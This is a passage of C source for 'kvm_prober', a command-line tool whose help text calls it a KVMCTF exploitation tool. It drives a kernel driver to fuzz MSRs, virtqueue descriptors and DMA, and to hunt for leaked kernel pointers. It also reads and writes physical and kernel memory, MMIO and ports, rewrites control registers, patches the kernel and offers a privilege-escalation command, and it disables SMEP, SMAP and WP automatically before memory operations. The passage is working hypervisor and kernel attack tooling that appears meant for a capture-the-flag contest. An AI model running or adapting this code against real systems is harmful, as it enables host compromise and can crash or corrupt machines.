            safe_log(dma_probe_log, "Trigger hypercall failed: %s\n", strerror(errno));
        }
    }

    free_vq_page();
    safe_log(dma_probe_log, "=== dma_probe end ===\n");
}

void msr_fuzz(unsigned int start, unsigned int end, unsigned int patterns_mask) {
    if (!msr_fuzz_log) {
        msr_fuzz_log = fopen("msr_fuzz.log", "a");
        if (!msr_fuzz_log) {
            perror("msr_fuzz: fopen");
            return;
        }
    }

    safe_log(msr_fuzz_log, "=== msr_fuzz start: start=0x%x end=0x%x patterns_mask=0x%x ===\n",
             start, end, patterns_mask);

    for (unsigned int msr = start; msr <= end; msr++) {
        unsigned long long before = 0;
        struct msr_data rreq = { .msr = msr, .value = 0 };
        if (ioctl(fd, IOCTL_READ_MSR, &rreq) == 0) {
            before = rreq.value;
        } else {
            safe_log(msr_fuzz_log, "MSR 0x%x read failed: %s\n", msr, strerror(errno));
            continue;
        }

        safe_log(msr_fuzz_log, "MSR 0x%x before=0x%llx\n", msr, before);

        unsigned long long patterns[4];
        patterns[0] = 0ULL;
        patterns[1] = ~0ULL;
        patterns[2] = 0xdeadbeefdeadbeefULL;
        patterns[3] = ((unsigned long long)rand() << 32) ^ rand();

        for (int p = 0; p < 4; p++) {
            if (!(patterns_mask & (1u << p))) continue;
            struct msr_data wreq = { .msr = msr, .value = patterns[p] };
            if (ioctl(fd, IOCTL_WRITE_MSR, &wreq) != 0) {
                safe_log(msr_fuzz_log, "MSR 0x%x write pattern %d failed: %s\n", msr, p, strerror(errno));
            } else {
                struct msr_data r2 = { .msr = msr, .value = 0 };
                if (ioctl(fd, IOCTL_READ_MSR, &r2) == 0) {
                    safe_log(msr_fuzz_log, "MSR 0x%x wrote 0x%llx readback 0x%llx\n", msr, patterns[p], r2.value);
                } else {
                    safe_log(msr_fuzz_log, "MSR 0x%x readback failed after write: %s\n", msr, strerror(errno));
                }
            }
        }

        struct msr_data restore = { .msr = msr, .value = before };
        ioctl(fd, IOCTL_WRITE_MSR, &restore);
    }

    safe_log(msr_fuzz_log, "=== msr_fuzz end ===\n");
}

/* ========================================================================
 * CRASH MONITOR
 * ======================================================================== */

static void *crash_monitor_thread(void *arg) {
    FILE *fp;
    char buf[4096];
    crash_monitor_running = 1;

    fp = popen("dmesg -w", "r");
    if (!fp) {
        perror("crash_monitor: popen dmesg -w");
        crash_monitor_running = 0;
        return NULL;
    }

    FILE *out = fopen("kvm_probe_dmesg.log", "a");
    if (!out) out = fp;

    while (crash_monitor_running && fgets(buf, sizeof(buf), fp) != NULL) {
        if (out && out != fp) {
            fprintf(out, "%s", buf);
            fflush(out);
        } else {
            printf("[dmesg] %s", buf);
        }

        if (strstr(buf, "BUG:") || strstr(buf, "Oops:") || strstr(buf, "Kernel panic") ||
            strstr(buf, "KASAN:") || strstr(buf, "Call Trace") ) {
            printf("[!] DETECTED kernel OOPS/BUG/PANIC line: %s", buf);
            if (out) {
                fprintf(out, "[!] ALERT: %s", buf);
                fflush(out);
            }
        }
    }

    if (out && out != fp) fclose(out);
    pclose(fp);
    crash_monitor_running = 0;
    return NULL;
}

void start_crash_monitor(void) {
    if (crash_monitor_running) {
        printf("[!] crash_monitor already running\n");
        return;
    }
    if (pthread_create(&crash_thread, NULL, crash_monitor_thread, NULL) != 0) {
        perror("start_crash_monitor: pthread_create");
        return;
    }
    printf("[+] crash_monitor started (logging to kvm_probe_dmesg.log)\n");
}

void stop_crash_monitor(void) {
    if (!crash_monitor_running) {
        printf("[!] crash_monitor not running\n");
        return;
    }
    crash_monitor_running = 0;
    pthread_kill(crash_thread, SIGINT);
    pthread_join(crash_thread, NULL);
    printf("[+] crash_monitor stopped\n");
}

/* ========================================================================
 * V2P FAST SCANNER
 * ======================================================================== */

void virt_to_phys_scan_fast(unsigned long target_phys, unsigned long start_va, 
                            unsigned long end_va, unsigned long step, unsigned long progress_every) {
    printf("[+] Fast scanning virtual range 0x%lx-0x%lx for physical 0x%lx (step: 0x%lx)\n",
           start_va, end_va, target_phys, step);

    unsigned long current_va = start_va;
    int found = 0;
    unsigned long iter = 0;

    while (current_va <= end_va) {
        unsigned long test_va = current_va;
        if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &test_va) == 0) {
            if (test_va == target_phys) {
                printf("[+] FOUND: Virtual 0x%lx -> Physical 0x%lx\n", current_va, test_va);
                found++;
            }
        }
        iter++;
        if (progress_every && (iter % progress_every) == 0) {
            printf("[.] Progress: scanned %lu addresses, current_va=0x%lx\n", iter, current_va);
        }
        current_va += step;
    }

    if (!found) {
        printf("[-] No virtual addresses found mapping to physical 0x%lx\n", target_phys);
    } else {
        printf("[+] Found %d virtual address(es) mapping to physical 0x%lx\n", found, target_phys);
    }
}

/* ========================================================================
 * SECTION 6: ADAPTIVE LEAK FUZZING (NEW)
 * ======================================================================== */

/* Adaptive VQ fuzzing with leak detection */
void adaptive_vq_leak_fuzz(int max_iterations, int starting_corruption) {
    if (!leak_log) {
        leak_log = fopen("adaptive_leak.log", "a");
        if (!leak_log) {
            perror("Failed to open leak log");
            return;
        }
    }
    
    printf("=== ADAPTIVE LEAK FUZZER ===\n");
    printf("[+] Starting with corruption level: %d\n", starting_corruption);
    printf("[+] Max iterations: %d\n", max_iterations);
    printf("[+] Monitoring for kernel pointer leaks...\n\n");
    
    safe_log(leak_log, "=== adaptive_vq_leak_fuzz start: max_iter=%d corruption=%d ===\n",
             max_iterations, starting_corruption);
    
    int corruption_level = starting_corruption;
    int phase = 1;
    
    while (corruption_level <= 100 && phase <= 10) {
        printf("\n[PHASE %d] Corruption Level: %d%%\n", phase, corruption_level);
        safe_log(leak_log, "\n[PHASE %d] Corruption Level: %d%%\n", phase, corruption_level);
        
        /* Allocate VQ page */
        alloc_vq_page();
        
        int iterations_this_phase = max_iterations / 10;
        int leaks_this_phase = 0;
        
        for (int i = 0; i < iterations_this_phase; i++) {
            struct vq_desc_user_data desc;
            memset(&desc, 0, sizeof(desc));
            
            /* Apply corruption based on level */
            if (rand() % 100 < corruption_level) {
                /* Corrupted descriptor */
                desc.index = rand() % 256;
                
                /* Gradually increase address corruption */
                if (corruption_level < 30) {
                    /* Mild: Small offsets */
                    desc.phys_addr = 0x1000 + (rand() % 0x10000);
                } else if (corruption_level < 60) {
                    /* Medium: Larger ranges */
                    desc.phys_addr = (rand() % 0x100000);
                } else {
                    /* Aggressive: Full random */
                    desc.phys_addr = ((uint64_t)rand() << 32) ^ rand();
                }
                
                /* Length corruption increases with level */
                if (corruption_level < 40) {
                    desc.len = rand() % 4096;
                } else if (corruption_level < 70) {
                    desc.len = rand() % 0x10000;
                } else {
                    desc.len = (uint32_t)rand();
                }
                
                desc.flags = (rand() % 100 < corruption_level) ? rand() & 0xffff : 0;
                desc.next_idx = rand() % 256;
            } else {
                /* Valid descriptor */
                desc.index = i % 256;
                desc.phys_addr = 0x1000 + (i * 0x1000);
                desc.len = 0x1000;
                desc.flags = 0;
                desc.next_idx = (i + 1) % 256;
            }
            
            if (ioctl(fd, IOCTL_WRITE_VQ_DESC, &desc) < 0) {
                safe_log(leak_log, "[%d] WRITE_VQ_DESC failed: %s\n", i, strerror(errno));
            }
            
            /* Trigger every 10 operations */
            if (i % 10 == 0) {
                long ret;
                if (ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &ret) < 0) {
                    safe_log(leak_log, "[%d] Hypercall failed, system may be unstable\n", i);
                    goto cleanup_phase;
                }
                
                /* Check for leaks in nearby memory */
                if (desc.phys_addr > 0 && desc.phys_addr < 0x100000000UL) {
                    int found = safe_read_with_leak_check(desc.phys_addr, 
                                                          min(desc.len, 4096), 
                                                          "vq_corruption");
                    if (found > 0) {
                        leaks_this_phase += found;
                        printf("[+] Found %d leaks after corruption at index %d\n", found, i);
                    }
                }
                
                /* Health check every 50 iterations */
                if (i % 50 == 0) {
                    if (!check_system_health()) {
                        printf("[!] System health check FAILED - stopping fuzzing\n");
                        safe_log(leak_log, "[!] System health check FAILED at iteration %d\n", i);
                        goto cleanup_phase;
                    }
                }
            }
            
            /* Small delay to prevent overwhelming the system */
            usleep(1000); /* 1ms */
        }
        
cleanup_phase:
        free_vq_page();
        
        printf("[PHASE %d] Complete - Found %d potential leaks\n", phase, leaks_this_phase);
        safe_log(leak_log, "[PHASE %d] Complete - Found %d potential leaks\n", 
                phase, leaks_this_phase);
        
        if (leaks_this_phase > 0) {
            printf("[+] SUCCESS! Found leaks at corruption level %d%%\n", corruption_level);
            printf("[+] Continuing to next phase to find more...\n");
        }
        
        /* Check system health before continuing */
        if (!check_system_health()) {
            printf("[!] System unstable - stopping\n");
            break;
        }
        
        /* Increase corruption for next phase */
        corruption_level += 10;
        phase++;
        
        /* Brief pause between phases */
        sleep(1);
    }
    
    /* Summary */
    printf("\n=== FUZZING COMPLETE ===\n");
    printf("[+] Total leaks found: %d\n", g_leak_count);
    if (g_leak_count > 0) {
        printf("[+] Leak candidates:\n");
        for (int i = 0; i < g_leak_count && i < 20; i++) {
            printf("    [%d] 0x%lx: ", i, g_leak_candidates[i].addr);
            for (int j = 0; j < 8; j++) {
                printf("%02x ", g_leak_candidates[i].data[j]);
            }
            printf("(%s)\n", g_leak_candidates[i].source);
        }
    }
    
    safe_log(leak_log, "=== adaptive_vq_leak_fuzz complete: total_leaks=%d ===\n", g_leak_count);
}

/* Targeted DMA leak fuzzer */
void adaptive_dma_leak_fuzz(int pages, int corruption) {
    if (!leak_log) {
        leak_log = fopen("adaptive_leak.log", "a");
    }
    
    printf("=== ADAPTIVE DMA LEAK FUZZER ===\n");
    printf("[+] Pages: %d, Starting corruption: %d%%\n", pages, corruption);
    
    if (pages <= 0 || pages > 16) pages = 8;
    
    int corruption_level = corruption;
    
    for (int phase = 1; phase <= 5; phase++) {
        printf("\n[DMA PHASE %d] Corruption: %d%%\n", phase, corruption_level);
        
        unsigned long phys_addrs[16] = {0};
        if (ioctl(fd, IOCTL_ALLOC_ROOT_PAGES, phys_addrs) != 0) {
            perror("ALLOC_ROOT_PAGES failed");
            return;
        }
        
        /* Write patterns with increasing corruption */
        for (int i = 0; i < pages; i++) {
            unsigned char buf[4096];
            
            if (rand() % 100 < corruption_level) {
                /* Corrupted pattern - might trigger leaks */
                for (int j = 0; j < 4096; j++) {
                    if (rand() % 100 < 50) {
                        /* Random data */
                        buf[j] = rand() & 0xff;
                    } else {
                        /* Pattern that might trigger bugs */
                        buf[j] = 0x41 + (j % 26);
                    }
                }
            } else {
                /* Clean pattern */
                memset(buf, 0x00, sizeof(buf));
            }
            
            struct physical_rw req = {
                .phys_addr = phys_addrs[i],
                .size = sizeof(buf),
                .user_buffer = buf
            };
            
            if (ioctl(fd, IOCTL_WRITE_PHYSICAL, &req) != 0) {
                printf("[!] Write failed for page %d\n", i);
                continue;
            }
        }
        
        /* Setup VQ descriptors */
        alloc_vq_page();
        for (int i = 0; i < pages; i++) {
            struct vq_desc_user_data desc = {
                .index = (uint16_t)i,
                .phys_addr = (uint64_t)phys_addrs[i],
                .len = 4096,
                .flags = (rand() % 100 < corruption_level) ? (rand() & 0xffff) : 0,
                .next_idx = (uint16_t)((i + 1) % pages)
            };
            ioctl(fd, IOCTL_WRITE_VQ_DESC, &desc);
        }
        
        /* Trigger and check for leaks */
        long ret;
        ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &ret);
        
        /* Scan all allocated pages for leaks */
        int leaks_found = 0;
        for (int i = 0; i < pages; i++) {
            int found = safe_read_with_leak_check(phys_addrs[i], 4096, "dma_page");
            leaks_found += found;
        }
        
        free_vq_page();
        
        printf("[DMA PHASE %d] Found %d leaks\n", phase, leaks_found);
        
        if (!check_system_health()) {
            printf("[!] System unstable, stopping\n");
            break;
        }
        
        corruption_level += 15;
        sleep(1);
    }
    
    printf("\n[+] DMA leak fuzzing complete\n");
}

/* Progressive memory scanner - scans with increasing depth */
void progressive_memory_scan(unsigned long start_addr, unsigned long end_addr, 
                            unsigned long step, int phases) {
    if (!leak_log) {
        leak_log = fopen("adaptive_leak.log", "a");
    }
    
    printf("=== PROGRESSIVE MEMORY SCANNER ===\n");
    printf("[+] Range: 0x%lx - 0x%lx\n", start_addr, end_addr);
    printf("[+] Phases: %d, Step: 0x%lx\n", phases, step);
    
    unsigned long current_step = step;
    
    for (int phase = 1; phase <= phases; phase++) {
        printf("\n[SCAN PHASE %d] Step size: 0x%lx\n", phase, current_step);
        
        int leaks_this_phase = 0;
        unsigned long addr = start_addr;
        int scanned = 0;
        
        while (addr < end_addr) {
            int found = safe_read_with_leak_check(addr, 4096, "progressive_scan");
            if (found > 0) {
                leaks_this_phase += found;
                printf("[+] Found %d leaks at 0x%lx\n", found, addr);
            }
            
            addr += current_step;
            scanned++;
            
            if (scanned % 100 == 0) {
                printf("[.] Scanned %d addresses, found %d leaks so far\n", 
                       scanned, leaks_this_phase);
                
                if (!check_system_health()) {
                    printf("[!] System health check failed\n");
                    return;
                }
            }
        }
        
        printf("[SCAN PHASE %d] Complete - Found %d leaks\n", phase, leaks_this_phase);
        
        /* Reduce step size for next phase (more granular) */
        current_step = current_step / 2;
        if (current_step < 0x1000) current_step = 0x1000; /* Minimum page size */
        
        sleep(1);
    }
    
    printf("\n[+] Progressive scan complete - Total leaks: %d\n", g_leak_count);
}

/* Show all detected leak candidates */
void show_leak_candidates(void) {
    printf("=== DETECTED LEAK CANDIDATES (%d) ===\n", g_leak_count);
    
    if (g_leak_count == 0) {
        printf("No leak candidates found\n");
        return;
    }
    
    for (int i = 0; i < g_leak_count; i++) {
        struct leak_candidate *leak = &g_leak_candidates[i];
        printf("[%d] Address: 0x%lx\n", i, leak->addr);
        printf("     Source: %s\n", leak->source);
        printf("     Confidence: %d\n", leak->confidence);
        printf("     Data (first 16 bytes): ");
        for (int j = 0; j < 16; j++) {
            printf("%02x ", leak->data[j]);
        }
        printf("\n     ASCII: ");
        for (int j = 0; j < 16; j++) {
            unsigned char c = leak->data[j];
            printf("%c", isprint(c) ? c : '.');
        }
        printf("\n");
        
        /* Extract potential pointer values */
        for (int j = 0; j <= 8; j++) {
            if (j <= 8) {
                unsigned long value = *(unsigned long*)(leak->data + j);
                if (looks_like_kernel_pointer(value)) {
                    printf("     Potential pointer at offset %d: 0x%lx\n", j, value);
                }
            }
        }
        printf("\n");
    }
}

/* Reset leak candidate list */
void reset_leak_candidates(void) {
    memset(g_leak_candidates, 0, sizeof(g_leak_candidates));
    g_leak_count = 0;
}

/* ========================================================================
 * SECTION 7: HELP FUNCTION
 * ======================================================================== */

void print_help(void) {
    printf("╔═══════════════════════════════════════════════════════════════════════╗\n");
    printf("║                   KVMCTF EXPLOITATION TOOL - v2.0                      ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════════╝\n\n");
    printf("\n");

    printf("CORE OPERATIONS:\n");
    printf("  ────────────────────────────────────────────────────────────────────────\n");
    printf("  help                                                     - Show this help message\n");
    printf("  init                                                     - Initialize connection to driver\n");
    printf("  status                                                   - Check driver status\n");
    printf("  alloc_vq_page                                            - Allocate virtqueue page\n");
    printf("  free_vq_page                                             - Free virtqueue page\n");
    printf("  crash_monitor start/stop                                 - Monitor kernel logs for crashes\n");
    printf("  kaslr                                                    - Get KASLR slide offset\n");
    printf("  kernel_base                                              - Get kernel base address\n");
    printf("  current_task                                             - Get current task_struct address\n");
    printf("  lookup <symbol>                                          - Lookup kernel symbol address\n");
    printf("            Example: kvm_prober lookup init_task\n");
    printf("\n");

    printf("REGISTER & PROTECTION OPERATIONS:\n");
    printf("  ────────────────────────────────────────────────────────────────────────\n");
    printf("  read_efer                                                - Read EFER register\n");
    printf("  read_cr0/cr4                                             - Read control registers\n");
    printf("  write_cr0/cr4 <value>                                    - Write control registers\n");
    printf("  enable_smep/smap/wp                                      - Enable protections\n");
    printf("  enable_nx/disable_nx                                     - Control NX bit\n");
    printf("  escalate                                                 - Attempt privilege escalation\n");
    printf("            Example: kvm_prober write_cr0 0x80050033\n");
    printf("  read_msr <msr>                                           - Read MSR\n");
    printf("            Example: kvm_prober read_msr 0xC0000080\n");
    printf("  write_msr <msr> <value>                                  - Write MSR\n");
    printf("            Example: kvm_prober write_msr 0xC0000080 0x12345678\n");
    printf("  virt_to_phys <va>                                        - Translate virtual address to physical\n");
    printf("            Example: kvm_prober virt_to_phys 0xffff888000000000\n");
    printf("  trigger_hypercall                                        - Trigger default hypercall\n");
    printf("            Example: kvm_prober trigger_hypercall\n");
    printf("  hypercall <nr> <a0> <a1> <a2> <a3>                       - Trigger hypercall\n");
    printf("            Example: kvm_prober hypercall 42 1 2 3 4\n");
    printf("  NOTE: SMEP/SMAP/WP are automatically disabled before all read/write ops\n");
    printf("\n");

    printf("AUTOMATION HARNESSES:\n");
    printf("  ────────────────────────────────────────────────────────────────────────\n");
    printf("  vq_fuzz <iter> <max_idx> <mode> [trigger]                - Fuzz virtqueue descriptors\n");
    printf("            Example: kvm_prober vq_fuzz 100 64 random crash\n");
    printf("  dma_probe <pages> <pattern> <trigger>                    - Allocate physical pages and create DMA descriptors\n");
    printf("            Example: kvm_prober dma_probe 16 deadbeef crash\n");
    printf("  msr_fuzz <start> <end> <patterns_mask>                   - Fuzz Model-Specific Registers\n");
    printf("            Example: kvm_prober msr_fuzz 0x0 0x100 0xff\n");
    printf("  v2p_fast <phys> [start] [end] [step] [progress]          - Fast scan virtual→physical mappings\n");
    printf("            Example: kvm_prober v2p_fast 0x100000 0x200000 0x1000 yes\n");
    printf("  adaptive_vq_fuzz  <max_iter> [corruption_%%]              - Gradually increase VQ corruption until leaks are detected\n");
    printf("            Example: kvm_prober adaptive_vq_fuzz 1000 10\n");
    printf("  adaptive_dma_fuzz <pages> [corruption_%%]                 - DMA-based adaptive fuzzing with leak detection\n");
    printf("            Example: kvm_prober adaptive_dma_fuzz 8 20\n");
    printf("  progressive_scan <start> <end> [step] [phases]           - Multi-phase memory scan with increasing granularity\n");
    printf("            Example: kvm_prober progressive_scan 0x1000000 0x2000000 0x10000 5\n");
    printf("  show_leaks                                               - Display all detected leak candidates\n");
    printf("            Example: kvm_prober show_leaks\n");
    printf("  reset_leaks                                              - Clear leak candidate list\n");
    printf("            Example: kvm_prober reset_leaks\n");
    printf("\n");

    printf("READ/WRITE/SCAN OPERATIONS:\n");
    printf("  ────────────────────────────────────────────────────────────────────────\n");
    printf("  read_phys <addr> <size>                                  - Read physical memory\n");
    printf("            Example: kvm_prober read_phys 0x100000 64\n");
    printf("  read_kernel <addr> <size>                                - Read kernel virtual memory\n");
    printf("            Example: kvm_prober read_kernel 0xffffffff81000000 128\n");
    printf("  read_mmio <addr> <size>                                  - Read MMIO region\n");
    printf("            Example: kvm_prober read_mmio 0xfe000000 16\n");
    printf("  write_kernel <addr> <hex_data>                           - Write to kernel virtual memory\n");
    printf("            Example: kvm_prober write_kernel 0xffffffff81000000 deadbeef\n");
    printf("  write_phys <addr> <hex_data>                             - Write to physical memory\n");
    printf("            Example: kvm_prober write_phys 0x100000 cafebabe\n");
    printf("  write_mmio <addr> <val>                                  - Write to MMIO region\n");
    printf("            Example: kvm_prober write_mmio 0xfe000000 0x1\n");
    printf("  scan_phys <start> <end>                                  - Scan physical memory range\n");
    printf("            Example: kvm_prober scan_phys 0x100000 0x200000\n");
    printf("  scan_kernel <start> <end>                                - Scan kernel virtual memory range\n");
    printf("            Example: kvm_prober scan_kernel 0xffffffff81000000 0xffffffff82000000\n");
    printf("  scan_mmio  <start> <end>                                 - Scan MMIO region\n");
    printf("            Example: kvm_prober scan_mmio 0xfe000000 0xfe100000\n");
    printf("  write_port <port> <val>                                  - Write to I/O port\n");
    printf("            Example: kvm_prober write_port 0x3f8 0x41\n");
    printf("  read_port <port>                                         - Read from I/O port\n");
    printf("            Example: kvm_prober read_port 0x3f8\n");
    printf("  patch <addr> <hex_data>                                  - Patch memory at given address\n");
    printf("            Example: kvm_prober patch 0xffffffff81000000 9090\n");
    printf("\n");
    printf("      ***OPTIONS***\n");
    printf("  -trigger <trigger word/hex>: Show only lines matching ASCII or hex pattern (little-endian)\n");
    printf("  -head <num>: Show N bytes before trigger match (default: 0)\n");
    printf("  -tail <num>: Show N bytes after trigger match (default: 0)\n");
    printf("\n");

    printf("╔═══════════════════════════════════════════════════════════════════════╗\n");
    printf("║                            WARNING                                     ║\n");
    printf("║  These operations can CRASH, CORRUPT, or DESTABILIZE the host system. ║\n");
    printf("║  Use ONLY on dedicated test systems with appropriate authorization.   ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════════╝\n");
}

/* ========================================================================
 * SECTION 8: MAIN FUNCTION
 * ======================================================================== */

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_help();
        return 1;
    }

    if (strcmp(argv[1], "help") == 0) {
        print_help();
        return 0;
    }

    if (init_driver() < 0) {
        return 1;
    }

    char *command = argv[1];

    /* Core commands */
    if (strcmp(command, "init") == 0) {
        printf("[+] Already initialized\n");
    }
    else if (strcmp(command, "virt_to_phys") == 0) {
        if (argc < 3) {
            printf("Usage: virt_to_phys <virtual_address>\n");
        } else {
            unsigned long va = strtoul(argv[2], NULL, 0);
            virt_to_phys(va);
        }
    }
    else if (strcmp(command, "alloc_vq_page") == 0) {
        alloc_vq_page();
    }
    else if (strcmp(command, "free_vq_page") == 0) {
        free_vq_page();
    }
    
    /* Register operations */
    else if (strcmp(command, "read_efer") == 0) {
        read_efer();
    }
    else if (strcmp(command, "enable_nx") == 0) {
        enable_nx();
    }
    else if (strcmp(command, "disable_nx") == 0) {
        disable_nx();
    }
    else if (strcmp(command, "read_cr0") == 0) {
        read_cr0();
    }
    else if (strcmp(command, "write_cr0") == 0) {
        if (argc < 3) {
            printf("Usage: write_cr0 <value>\n");
        } else {
            unsigned long value = strtoul(argv[2], NULL, 0);
            write_cr0(value);
        }
    }
    else if (strcmp(command, "read_cr4") == 0) {
        read_cr4();
    }
    else if (strcmp(command, "write_cr4") == 0) {
        if (argc < 3) {
            printf("Usage: write_cr4 <value>\n");
        } else {
            unsigned long value = strtoul(argv[2], NULL, 0);
            write_cr4(value);
        }
    }
    else if (strcmp(command, "read_msr") == 0) {
        if (argc < 3) {
            printf("Usage: read_msr <msr_number>\n");
        } else {
            unsigned int msr = (unsigned int)strtoul(argv[2], NULL, 0);
            read_msr(msr);
        }
    }
    else if (strcmp(command, "write_msr") == 0) {
        if (argc < 4) {
            printf("Usage: write_msr <msr_number> <value>\n");
        } else {
            unsigned int msr = (unsigned int)strtoul(argv[2], NULL, 0);
            unsigned long long value = strtoull(argv[3], NULL, 0);
            write_msr(msr, value);
        }
    }
    else if (strcmp(command, "enable_smep") == 0) {
        enable_smep();
    }
    else if (strcmp(command, "enable_smap") == 0) {
        enable_smap();
    }
    else if (strcmp(command, "enable_wp") == 0) {
        enable_wp();
    }
    
    /* Memory read operations with trigger support */
    else if (strcmp(command, "read_kernel") == 0) {
        if (argc < 4) {
            printf("Usage: read_kernel <address> <size> [-trigger <pattern>] [-head <bytes>] [-tail <bytes>]\n");
        } else {
            unsigned long addr = strtoul(argv[2], NULL, 0);
            unsigned long size = strtoul(argv[3], NULL, 0);
            const char *trigger = NULL;
            unsigned long head = 0, tail = 0;
            
            for (int i = 4; i < argc; i++) {
                if (strcmp(argv[i], "-trigger") == 0 && i + 1 < argc) {
                    trigger = argv[++i];
                } else if (strcmp(argv[i], "-head") == 0 && i + 1 < argc) {
                    head = strtoul(argv[++i], NULL, 0);
                } else if (strcmp(argv[i], "-tail") == 0 && i + 1 < argc) {
                    tail = strtoul(argv[++i], NULL, 0);
                }
            }
            
            read_kernel_mem(addr, size, trigger, head, tail);
        }
    }
    else if (strcmp(command, "read_phys") == 0) {
        if (argc < 4) {
            printf("Usage: read_phys <address> <size> [-trigger <pattern>] [-head <bytes>] [-tail <bytes>]\n");
        } else {
            unsigned long addr = strtoul(argv[2], NULL, 0);
            unsigned long size = strtoul(argv[3], NULL, 0);
            const char *trigger = NULL;
            unsigned long head = 0, tail = 0;
            
            for (int i = 4; i < argc; i++) {
                if (strcmp(argv[i], "-trigger") == 0 && i + 1 < argc) {
                    trigger = argv[++i];
                } else if (strcmp(argv[i], "-head") == 0 && i + 1 < argc) {
                    head = strtoul(argv[++i], NULL, 0);
                } else if (strcmp(argv[i], "-tail") == 0 && i + 1 < argc) {
                    tail = strtoul(argv[++i], NULL, 0);
                }
            }
            
            read_physical_mem(addr, size, trigger, head, tail);
        }
    }
    else if (strcmp(command, "read_mmio") == 0) {
        if (argc < 4) {
            printf("Usage: read_mmio <address> <size> [-trigger <pattern>] [-head <bytes>] [-tail <bytes>]\n");
        } else {
            unsigned long addr = strtoul(argv[2], NULL, 0);
            unsigned long size = strtoul(argv[3], NULL, 0);
            const char *trigger = NULL;
            unsigned long head = 0, tail = 0;
            
            for (int i = 4; i < argc; i++) {
                if (strcmp(argv[i], "-trigger") == 0 && i + 1 < argc) {
                    trigger = argv[++i];
                } else if (strcmp(argv[i], "-head") == 0 && i + 1 < argc) {
                    head = strtoul(argv[++i], NULL, 0);
                } else if (strcmp(argv[i], "-tail") == 0 && i + 1 < argc) {
                    tail = strtoul(argv[++i], NULL, 0);
                }
            }
            
            read_mmio(addr, size, trigger, head, tail);
        }
    }
    
    /* Scan operations */
    else if (strcmp(command, "scan_phys") == 0) {
        if (argc < 4) {
            printf("Usage: scan_phys <start> <end> [-trigger <pattern>] [-head <bytes>] [-tail <bytes>]\n");
        } else {
            unsigned long start = strtoul(argv[2], NULL, 0);
            unsigned long end = strtoul(argv[3], NULL, 0);
            const char *trigger = NULL;
            unsigned long head = 0, tail = 0;
            
            for (int i = 4; i < argc; i++) {
                if (strcmp(argv[i], "-trigger") == 0 && i + 1 < argc) {
                    trigger = argv[++i];
                } else if (strcmp(argv[i], "-head") == 0 && i + 1 < argc) {
                    head = strtoul(argv[++i], NULL, 0);
                } else if (strcmp(argv[i], "-tail") == 0 && i + 1 < argc) {
                    tail = strtoul(argv[++i], NULL, 0);
                }
            }
            
            scan_physical_mem(start, end, trigger, head, tail);
        }
    }
    else if (strcmp(command, "scan_kernel") == 0) {
        if (argc < 4) {
            printf("Usage: scan_kernel <start> <end> [-trigger <pattern>] [-head <bytes>] [-tail <bytes>]\n");
        } else {
            unsigned long start = strtoul(argv[2], NULL, 0);
            unsigned long end = strtoul(argv[3], NULL, 0);
            const char *trigger = NULL;
            unsigned long head = 0, tail = 0;
            
            for (int i = 4; i < argc; i++) {
                if (strcmp(argv[i], "-trigger") == 0 && i + 1 < argc) {
                    trigger = argv[++i];
                } else if (strcmp(argv[i], "-head") == 0 && i + 1 < argc) {
                    head = strtoul(argv[++i], NULL, 0);
                } else if (strcmp(argv[i], "-tail") == 0 && i + 1 < argc) {
                    tail = strtoul(argv[++i], NULL, 0);
                }
            }
            
            scan_kernel_mem(start, end, trigger, head, tail);
        }
    }
    else if (strcmp(command, "scan_mmio") == 0) {
        if (argc < 4) {
            printf("Usage: scan_mmio <start> <end> [-trigger <pattern>] [-head <bytes>] [-tail <bytes>]\n");
        } else {
            unsigned long start = strtoul(argv[2], NULL, 0);
            unsigned long end = strtoul(argv[3], NULL, 0);
            const char *trigger = NULL;
            unsigned long head = 0, tail = 0;
            
            for (int i = 4; i < argc; i++) {
                if (strcmp(argv[i], "-trigger") == 0 && i + 1 < argc) {
                    trigger = argv[++i];
                } else if (strcmp(argv[i], "-head") == 0 && i + 1 < argc) {
                    head = strtoul(argv[++i], NULL, 0);
                } else if (strcmp(argv[i], "-tail") == 0 && i + 1 < argc) {
                    tail = strtoul(argv[++i], NULL, 0);
                }
            }
            
            scan_mmio(start, end, trigger, head, tail);
        }
    }
    
    /* Write operations */
    else if (strcmp(command, "write_kernel") == 0) {
        if (argc < 4) {
            printf("Usage: write_kernel <address> <hex_data>\n");
        } else {
            unsigned long addr = strtoul(argv[2], NULL, 0);
            char *hex_data = argv[3];
            size_t len = strlen(hex_data);
            if (len % 2 != 0) {
                printf("Error: Hex data must have even number of characters\n");
                return 1;
            }
            size_t data_len = len / 2;
            unsigned char *data = malloc(data_len);
            for (size_t i = 0; i < data_len; i++) {
                sscanf(hex_data + 2*i, "%2hhx", &data[i]);
            }
            write_kernel_mem(addr, data, data_len);
            free(data);
        }
    }
    else if (strcmp(command, "write_phys") == 0) {
        if (argc < 4) {
            printf("Usage: write_phys <address> <hex_data>\n");
        } else {
            unsigned long addr = strtoul(argv[2], NULL, 0);
            char *hex_data = argv[3];
            size_t len = strlen(hex_data);
            if (len % 2 != 0) {
                printf("Error: Hex data must have even number of characters\n");
                return 1;
            }
            size_t data_len = len / 2;
            unsigned char *data = malloc(data_len);
            for (size_t i = 0; i < data_len; i++) {
                sscanf(hex_data + 2*i, "%2hhx", &data[i]);
            }
            write_physical_mem(addr, data, data_len);
            free(data);
        }
    }
    else if (strcmp(command, "patch") == 0) {
        if (argc < 4) {
            printf("Usage: patch <address> <hex_data>\n");
        } else {
            unsigned long addr = strtoul(argv[2], NULL, 0);
            char *hex_data = argv[3];
            size_t len = strlen(hex_data);
            if (len % 2 != 0) {
                printf("Error: Hex data must have even number of characters\n");
                return 1;
            }
            size_t data_len = len / 2;
            unsigned char *data = malloc(data_len);
            for (size_t i = 0; i < data_len; i++) {
                sscanf(hex_data + 2*i, "%2hhx", &data[i]);
            }
            patch_kernel(addr, data, data_len);
            free(data);
        }
    }
    else if (strcmp(command, "write_mmio") == 0) {
        if (argc < 5) {
            printf("Usage: write_mmio <address> <size> <value>\n");
        } else {
            unsigned long addr = strtoul(argv[2], NULL, 0);
            unsigned long size = strtoul(argv[3], NULL, 0);
            unsigned long value = strtoul(argv[4], NULL, 0);
            write_mmio(addr, size, value);
        }
    }
    
    /* I/O operations */
    else if (strcmp(command, "read_port") == 0) {
        if (argc < 4) {
            printf("Usage: read_port <port> <size>\n");
        } else {
